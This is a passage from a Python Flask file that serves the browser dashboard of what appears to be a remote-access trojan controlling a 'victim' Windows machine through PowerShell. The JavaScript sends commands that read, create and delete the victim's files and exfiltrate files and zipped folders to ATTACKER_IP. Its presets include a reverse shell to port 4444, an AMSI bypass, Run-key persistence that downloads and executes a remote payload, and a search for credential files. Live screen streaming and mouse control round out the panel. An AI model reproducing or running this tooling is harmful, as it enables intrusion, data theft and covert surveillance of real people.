    const escapedContent = content.replace(/'/g, "''");
    sendCommand(`New-Item -Path '${path}' -ItemType File -Value '${escapedContent}' -Force | Out-String`);
    toast('Create file command sent');
  }

  function appendFileOnVictim() {
    const path = document.getElementById('newFilePath').value.trim();
    const content = document.getElementById('newFileContent').value;
    if (!path) return toast('Enter a file path', 'var(--danger)');
    const escapedContent = content.replace(/'/g, "''");
    sendCommand(`Add-Content -Path '${path}' -Value '${escapedContent}'; Write-Output "Appended to ${path}"`);
    toast('Append command sent');
  }

  function deleteFileOnVictim() {
    const path = document.getElementById('newFilePath').value.trim();
    if (!path) return toast('Enter a file path', 'var(--danger)');
    sendCommand(`Remove-Item -Path '${path}' -Force -ErrorAction SilentlyContinue; Write-Output "Deleted: ${path}"`);
    toast('Delete command sent', 'var(--danger)');
  }

  function listDirectory() {
    const path = document.getElementById('dirPath').value.trim() || '$env:USERPROFILE';
    sendCommand(`Get-ChildItem '${path}' | Format-Table Mode,LastWriteTime,Length,Name -AutoSize | Out-String`);
    toast('Directory listing queued');
  }

  function readFileContent() {
    const path = document.getElementById('dirPath').value.trim();
    if (!path) return toast('Enter a file path', 'var(--danger)');
    sendCommand(`Get-Content '${path}' -ErrorAction SilentlyContinue | Out-String`);
    toast('Read file command sent');
  }

  // Exfil
  function exfilFile() {
    const path = document.getElementById('exfilPath').value.trim();
    if (!path) return toast('Enter a file path', 'var(--danger)');
    sendCommand(`Invoke-WebRequest -Uri ${PROTOCOL}://${ATTACKER_IP}:8000/upload -Method POST -InFile '${path}' -ContentType 'multipart/form-data'`);
    toast('Exfil command sent', 'var(--accent2)');
  }

  function exfilDirectory() {
    const path = document.getElementById('exfilDir').value.trim();
    if (!path) return toast('Enter directory path', 'var(--danger)');
    sendCommand(`$zip="$env:TEMP\\exfil_$(Get-Date -Format yyyyMMddHHmm).zip"; Compress-Archive -Path '${path}' -DestinationPath $zip -Force; Invoke-WebRequest -Uri ${PROTOCOL}://${ATTACKER_IP}:8000/upload -Method POST -InFile $zip -ContentType 'multipart/form-data'; Remove-Item $zip`);
    toast('Zip & exfil command sent', 'var(--accent2)');
  }

  function loadPreset(type) {
    const presets = {
      rev: `$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()`,
      bypass: `# AMSI Bypass template\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
      persist: `$cmd = "powershell -WindowStyle Hidden -Command \\"IEX (New-Object Net.WebClient).DownloadString('${PROTOCOL}://${ATTACKER_IP}:8000/payload.ps1')\\""\nSet-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value $cmd\nWrite-Output "Persistence set"`,
      creds: `# Common cred locations\nGet-ChildItem C:\\Users -Recurse -Include unattend.xml,web.config,*.config,*.ini -ErrorAction SilentlyContinue | Select FullName | Out-String`
    };
    document.getElementById('customCmd').value = presets[type] || '';
    switchTab('execute');
    toast('Preset loaded');
  }

  // Media upload & apply
  async function uploadAndSetWallpaper(file) {
    const formData = new FormData();
    formData.append('file', file);
    const res = await fetch('/upload_media', { method: 'POST', body: formData });
    if (!res.ok) throw new Error('Upload failed');
    const data = await res.json();
    const mediaUrl = `${PROTOCOL}://${ATTACKER_IP}:8000/media/${data.filename}`;
    const cmd = `
      $url = '${mediaUrl}';
      $out = "$env:TEMP\\wallpaper.jpg";
      Invoke-WebRequest -Uri $url -OutFile $out;
      Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name Wallpaper -Value $out;
      RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
    `;
    sendCommand(cmd);
    toast('Wallpaper command sent');
  }

  async function uploadAndPlaySound(file) {
    const formData = new FormData();
    formData.append('file', file);
    const res = await fetch('/upload_media', { method: 'POST', body: formData });
    if (!res.ok) throw new Error('Upload failed');
    const data = await res.json();
    const mediaUrl = `${PROTOCOL}://${ATTACKER_IP}:8000/media/${data.filename}`;
    const cmd = `
      $url = '${mediaUrl}';
      $out = "$env:TEMP\\sound.wav";
      Invoke-WebRequest -Uri $url -OutFile $out;
      (New-Object Media.SoundPlayer $out).PlaySync()
    `;
    sendCommand(cmd);
    toast('Sound command sent');
  }

  // Live stream functions
  let streamInterval = null;

  function startStream() {
    if (streamInterval) clearInterval(streamInterval);
    const streamCmd = 'Start-ScreenStream';
    sendCommand(streamCmd);
    toast('Stream started (background job)');
    streamInterval = setInterval(updateLiveImage, 1000);
  }

  function stopStream() {
    if (streamInterval) clearInterval(streamInterval);
    streamInterval = null;
    sendCommand('Stop-Job -Name ScreenStream; Remove-Job -Name ScreenStream');
    toast('Stream stopped');
    document.getElementById('liveImage').src = '';
  }

  function updateLiveImage() {
    const img = document.getElementById('liveImage');
    img.src = `/latest_frame?t=${Date.now()}`;
  }

  function handleMouseClick(event) {
    const img = document.getElementById('liveImage');
    if (!img.complete || !img.naturalWidth) return;
    const rect = img.getBoundingClientRect();
    const scaleX = img.naturalWidth / rect.width;
    const scaleY = img.naturalHeight / rect.height;
    const clickX = (event.clientX - rect.left) * scaleX;
    const clickY = (event.clientY - rect.top) * scaleY;
    const x = Math.round(clickX);
    const y = Math.round(clickY);
    const moveCmd = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x}, ${y})`;
    sendCommand(moveCmd);
    toast(`Mouse moved to (${x}, ${y})`);
  }

  // Status polling
  function updateStatus() {
    fetch('/status')
      .then(r => r.json())
      .then(data => {
        const statusDot = document.querySelector('.status-dot');
        const statusText = document.getElementById('statusText');
        if (data.online) {
          statusDot.style.background = 'var(--accent3)';
          statusDot.style.boxShadow = 'var(--glow-green)';
          if (statusText) statusText.textContent = 'ONLINE';
        } else {
          statusDot.style.background = 'var(--danger)';
          statusDot.style.boxShadow = 'none';
          if (statusText) statusText.textContent = 'OFFLINE';
        }
      });
  }

  // Form submissions
  document.getElementById('wallpaperForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const file = document.getElementById('wallpaperFile').files[0];
    if (!file) return toast('Select an image file', 'var(--danger)');
    await uploadAndSetWallpaper(file);
  });

  document.getElementById('soundForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const file = document.getElementById('soundFile').files[0];
    if (!file) return toast('Select an audio file', 'var(--danger)');
    await uploadAndPlaySound(file);
  });

  setInterval(fetchResults, 3000);
  setInterval(updateStatus, 5000);
  window.onload = () => {
    fetchResults();
    updateStatus();
  };
</script>
</body>
</html>
'''

if __name__ == '__main__':
    # If you have SSL certificate, use ssl_context = ('cert.pem', 'key.pem')
    # Otherwise, comment out the next line to run on HTTP
    app.run(host='0.0.0.0', port=8000, debug=True)